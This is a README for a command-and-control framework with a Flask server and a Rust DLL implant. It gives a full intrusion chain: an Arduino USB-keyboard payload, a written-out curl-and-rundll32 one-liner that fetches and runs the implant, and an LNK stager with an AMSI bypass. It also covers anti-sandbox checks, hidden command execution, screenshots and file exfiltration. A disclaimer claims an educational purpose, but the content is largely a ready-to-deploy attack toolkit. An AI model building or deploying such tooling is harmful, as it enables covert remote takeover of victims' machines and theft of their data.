# LukiLab C2 — Command & Control Framework

A lightweight, full-featured Command & Control (C2) framework with a Python Flask server and a Rust-based agent DLL. Designed for educational purposes, red team exercises, and authorized security assessments.

```
┌─────────────────────┐         AES-256-CBC         ┌──────────────────────┐
│   Operator Browser   │    ──────────────────►      │   Target Machine      │
│  (LukiLab Dashboard) │    ◄──────────────────      │  (rundll32 + agent)   │
│   http://localhost    │     encrypted JSON          │  Windows x64          │
└──────────┬──────────┘                              └──────────────────────┘
           │                                                    ▲
           │ HTTP / JSON                                         │ beacon every
           ▼                                                    │ 10-15s (poll)
┌─────────────────────┐                                         │
│   Flask Server       │─────────────────────────────────────────┘
│   port 8080          │  Agent: register → poll tasks → execute → report
│   SQLite (c2.db)     │
│   REST API + Web UI  │
└─────────────────────┘
```

## Overview

**LukiLab C2** is a remote command execution framework consisting of two main components:

1. **Server** (`server.py`) — Python Flask application with a REST API, SQLite database, and web dashboard (LukiLab)
2. **Agent** (`agent/`) — Rust DLL loaded via `rundll32.exe`, beaconing to the server for tasks

Communication is fully encrypted with **AES-256-CBC**. All agent-to-server payloads are wrapped in `{"ct": "<base64>"}` envelopes.

---

## Features

### Server (Flask)
- RESTful API with 14+ endpoints
- SQLite database (SQLAlchemy ORM)
- Dual auth: master API key (operator) + per-agent tokens
- Staged delivery pipeline: .lnk → PowerShell → reflective DLL loading
- LukiLab Web Dashboard (login-protected):
  - Agent list with live status (hostname, user, IP, last seen)
  - Agent detail with command execution modal
  - Task history with stdout/stderr output
  - Troll button (speech synthesis + YouTube prank)
  - Delete agents and tasks
- Self-signed HTTPS certificate generator
- LNK generator (PowerShell AMSI bypass + LoadLibrary)
- AES-256-CBC encryption: `encrypt()` / `decrypt()` helpers

### Agent (Rust DLL)
- **Language:** Rust (compiled as `cdylib` DLL, ~330KB)
- **Size:** ~335KB compiled (release, x86_64)
- **Entry points:**
  - `DllMain` — no-op on attach (avoids loader lock deadlock)
  - `Run` — programmatic entry
  - `RunDllEntry` — `rundll32.exe` compatible entry (spawns agent + blocks)
- **Communication:** WinHTTP via raw Windows API (no external HTTP crates)
- **Crypto:** AES-256-CBC encrypt/decrypt with PKCS7 padding (no external crypto crates)
- **FFI:** Pure raw extern blocks — no `windows-sys` or `winapi` crate
- **Anti-sandbox:** Checks `IsDebuggerPresent`, CPU cores < 2, RAM < 2GB
- **Config obfuscation:** Build-time XOR (key `0xAA`) of sensitive strings in `build.rs`
- **Command types:**
  - `cmd` — `cmd.exe /C <command>` (hidden window)
  - `raw` — direct `CreateProcessW` execution
  - `powershell` — `powershell -EncodedCommand` (UTF-16LE base64, hidden window)
  - `sleep` — sleep for N seconds
  - `screenshot` — GDI screen capture (24-bit BMP data)
  - `download` — HTTP GET file download
  - `upload` — file upload to server
  - `exit` — clean agent termination

---

## Project Structure

```
C2/
├── server.py                 # Flask application (REST API + LukiLab UI)
├── crypto_helper.py          # AES-256-CBC encryption helpers
├── models.py                 # SQLAlchemy models (Agent, Task)
├── gen_cert.py               # Self-signed TLS certificate generator
├── gen_lnk.ps1               # Local .lnk generator script
├── config.json               # Server configuration
├── requirements.txt          # Python dependencies
├── arduino_payload.ino       # Arduino HID payload (LATAM keyboard)
├── test_api.py               # End-to-end API test script
├── test_scripts.txt          # Comprehensive test documentation
├── templates/                # HTML templates (Jinja2)
│   ├── lukilab_login.html
│   ├── lukilab_dashboard.html
│   ├── lukilab_agent.html
│   ├── dashboard.html
│   └── _table.html
├── agent/                    # Rust agent (cdylib DLL)
│   ├── Cargo.toml            # Rust dependencies
│   ├── build.rs              # Build-time config obfuscation
│   ├── build.bat             # Build script
│   └── src/
│       ├── lib.rs            # DLL entry points + agent main loop
│       ├── win32.rs          # Raw Windows API FFI declarations
│       ├── http.rs           # WinHTTP wrapper
│       ├── crypto.rs         # AES-256-CBC encrypt/decrypt
│       ├── api.rs            # C2 protocol API (register, poll, report)
│       └── commands.rs       # Command execution (cmd, ps, screenshot...)
└── instance/                 # SQLite database (auto-created)
    └── c2.db
```

---

## Quick Start

### Prerequisites
- Python 3.8+
- Rust + `x86_64-pc-windows-msvc` target
- Windows (for agent compilation and execution)
- Arduino Uno with ATmega16U2 (for HID payload)

### 1. Install Python dependencies
```bash
pip install -r requirements.txt
```

### 2. Configure
Edit `config.json`:
```json
{
  "api_key": "c2-master-key-2026",
  "aes_key_hex": "603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4",
  "c2_url": "https://your-domain.ngrok-free.dev",
  "host": "0.0.0.0",
  "port": 8080,
  "agent_poll_interval": 10,
  "jitter": 5,
  "task_timeout": 30
}
```

### 3. Generate TLS certificate (optional)
```bash
python gen_cert.py
```
Falls back to HTTP if no cert.pem/key.pem present.

### 4. Start the server
```bash
python server.py
```
Server runs on `http://0.0.0.0:8080`.

### 5. Build the agent DLL
```bash
cd agent
build.bat
```
Output: `agent/target/x86_64-pc-windows-msvc/release/c2_agent.dll`

### 6. Deploy agent to target
**One-liner (Win+R):**
```cmd
curl -s -o %TEMP%/d.dll https://your-server/api/stager/dll && rundll32 %TEMP%/d.dll,RunDllEntry
```

**Arduino HID payload:** Flash `arduino_payload.ino` to an Arduino Uno (with HID firmware). When connected via USB, it will automatically:
1. Open Win+R
2. Type `cmd` + Enter
3. Inject the curl + rundll32 command

### 7. Access the dashboard
Open `http://localhost:8080/lukilab/` and log in with password `2026`.

---

## API Reference

### Public Endpoints (no auth required)
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/health` | Health check + agent count |
| GET | `/stager.lnk` | Download .lnk file (PowerShell + AMSI bypass) |
| GET | `/api/stager/dll` | Download agent DLL |
| GET | `/api/stager/ps1` | PowerShell stager script |
| GET | `/api/stager/oneliner` | One-liner for Win+R |

### Operator API (requires `X-API-Key` header)
| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/agent/register` | Register a new agent (encrypted) |
| POST | `/api/execute` | Send command to agent |
| GET  | `/api/agents` | List all agents |

### Agent API (requires `X-Agent-Token` header)
| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/agent/poll` | Poll for pending tasks |
| POST | `/api/agent/result` | Report task execution result |
| POST | `/api/agent/upload` | Upload file from agent to server |

### LukiLab Web UI
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET/POST | `/lukilab/login` | Login page (password: `2026`) |
| GET | `/lukilab/` | Dashboard — agent list |
| GET | `/lukilab/agent/<id>` | Agent detail + task history |
| POST | `/lukilab/execute` | Send command to agent |
| POST | `/lukilab/delete/<task_id>` | Delete a single task |
| POST | `/lukilab/agent/<id>/delete` | Delete agent + all tasks |

---

## Encryption Details

- **Algorithm:** AES-256-CBC with PKCS7 padding
- **Key:** 32 bytes (64 hex chars in config)
- **IV:** 16 random bytes per encryption
- **Transport:** `base64(IV || ciphertext)`
- **Agent config:** Key XOR-obfuscated at build time with `0xAA`
- **Purpose:** All agent-server communication is encrypted. Operator endpoints use plain JSON.

---

## Staging Pipeline

### Stage 1: Arduino HID
Arduino emulates a USB keyboard, types Win+R, opens cmd, and injects the download-and-execute command.

### Stage 2: LNK File
A shortcut to `powershell.exe` with hidden window that:
1. Downloads the DLL via `WebClient.DownloadFile`
2. Performs AMSI bypass via `[PSObject].Assembly.GetType('System.Management.Automation.AmsiUtils')`
3. Loads the DLL via `[Runtime.InteropServices.Marshal]::LoadLibrary`
4. Deletes the DLL from disk

### Stage 3: DLL Execution
`rundll32.exe` loads `c2_agent.dll` with `RunDllEntry` export:
- Anti-sandbox checks
- Register with C2 server
- Beacon loop (poll every 10-15s with jitter)

---

## Agent Details

### Build Process (`build.rs`)
- Reads `config.json` at compile time
- XOR-obfuscates `c2_url`, `api_key`, `aes_key_hex` with key `0xAA`
- Generates `config_gen.rs` with byte arrays + deobfuscation function
- Embedds `POLL_INTERVAL`, `JITTER`, `TASK_TIMEOUT_MS` as integers

### Communication Flow
```
Agent                     Server
  │                         │
  ├── POST /agent/register ─┤  (encrypted hostname, username, OS)
  │                         ├── returns agent_id + token (encrypted)
  │                         │
  └── loop every 10-15s ───┤
      POST /agent/poll ────┤  (encrypted agent_id)
      │                     ├── returns pending tasks (encrypted)
      │                     │
      ├── execute command   │
      │                     │
      └── POST /agent/result┤  (encrypted stdout, stderr, exit_code)
```

### Anti-Analysis (`check_sandbox()`)
- `IsDebuggerPresent()` — detects debuggers
- `GetNativeSystemInfo` — checks CPU cores < 2
- `GlobalMemoryStatusEx` — checks RAM < 2GB

Aborts execution if any condition is met.

### Database Schema

**agents:**
| Column | Type | Description |
|--------|------|-------------|
| id | TEXT (UUID) | Primary key |
| hostname | TEXT | Target computer name |
| username | TEXT | Logged-in user |
| os | TEXT | Operating system |
| ip | TEXT | IP address |
| token | TEXT (unique) | Authentication token |
| first_seen | DATETIME | First registration |
| last_seen | DATETIME | Last beacon |
| status | TEXT | alive / dead |

**tasks:**
| Column | Type | Description |
|--------|------|-------------|
| id | TEXT (UUID) | Primary key |
| agent_id | TEXT (FK) | Reference to agents |
| type | TEXT | cmd / raw / powershell / sleep / screenshot / download / upload / exit |
| command | TEXT | Command to execute |
| status | TEXT | pending / running / done / failed |
| stdout | TEXT | Command output |
| stderr | TEXT | Error output |
| exit_code | INTEGER | Process exit code |
| created_at | DATETIME | Task creation time |
| completed_at | DATETIME | Task completion time |

---

## LukiLab Dashboard

The dashboard features a dark red-on-black hacker aesthetic with Segoe UI + Consolas fonts.

- **Agent list:** ID, hostname, user, IP, status (alive/dead), last seen
- **Agent detail:** Full info panel + command execution form + task history
- **Command types:** cmd, raw, powershell, exit (drop-down selector)
- **Task table:** ID, type, command, status (color-coded), stdout, stderr
- **Troll button:** Executes speech synthesis ("troliado puto") + opens YouTube video
- **Delete agent:** Removes agent and all associated tasks from the database
- **Stager panel:** Ready-to-use curl commands with forward slashes (LATAM compatible)

---


## Security Considerations

- **All traffic encrypted** with AES-256-CBC between agent and server
- **No persistent connections** — agent calls home every 10-15s with jitter
- **Hidden execution** — `CREATE_NO_WINDOW` flag prevents console windows
- **Anti-sandbox** — agent self-destructs in analysis environments
- **Config obfuscation** — sensitive strings XOR-encoded at build time
- **Token-based auth** — each agent has a unique token; no hardcoded secrets in agent after registration
- **Stager endpoints public** — DLL download requires no auth (DLL has embedded API key)

---

## Build Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `api_key` | `c2-master-key-2026` | Master authentication key |
| `aes_key_hex` | 64-char hex | AES-256 encryption key |
| `c2_url` | ngrok URL | Server base URL for agent |
| `host` | `0.0.0.0` | Server bind address |
| `port` | `8080` | Server port |
| `agent_poll_interval` | `10` | Seconds between beacons |
| `jitter` | `5` | Random delay added to interval |
| `task_timeout` | `30` | Max execution time per task (seconds) |

---

## Disclaimer

This software is intended for **educational purposes only**. Use only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors are not responsible for any misuse.

---

## License

MIT — do what you want, but don't be evil.
